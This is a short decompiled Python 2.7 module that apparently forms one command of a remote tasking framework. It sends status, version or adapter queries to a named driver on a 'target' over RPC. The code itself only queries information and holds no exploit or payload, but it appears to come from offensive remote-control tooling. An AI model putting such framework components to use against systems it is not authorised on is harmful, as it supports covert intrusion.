# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_DmGz_Tasking.py
QUERY_TYPE_STATUS = 1
QUERY_TYPE_VERSION = 2
QUERY_TYPE_ADAPTERS = 3

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.resource
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'dmgz.cmd.dmgz', globals())
    mcl.imports.ImportWithNamespace(namespace, 'dmgz.cmd.dmgz.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = dmgz.cmd.dmgz.Params()
    if lpParams['type'] == QUERY_TYPE_STATUS:
        tgtParams.type = dmgz.cmd.dmgz.PARAMS_TYPE_STATUS
    elif lpParams['type'] == QUERY_TYPE_VERSION:
        tgtParams.type = dmgz.cmd.dmgz.PARAMS_TYPE_VERSION
    elif lpParams['type'] == QUERY_TYPE_ADAPTERS:
        tgtParams.type = dmgz.cmd.dmgz.PARAMS_TYPE_ADAPTERS
    else:
        mcl.tasking.OutputError('Invalid input')
        return False
    if lpParams['driver'] != None:
        tgtParams.driver = lpParams['driver']
    if len(tgtParams.driver) == 0:
        try:
            name = mcl.tasking.resource.GetName('DmGz')
        except:
            mcl.tasking.OutputError('Unable to determine driver name')
            return False

        tgtParams.driver = name
    if len(tgtParams.driver) == 0:
        mcl.tasking.OutputError('A driver name must be specified')
        return False
    else:
        rpc = dmgz.cmd.dmgz.tasking.RPC_INFO_QUERY
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, dmgz.cmd.dmgz.errorStrings)
            return False
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)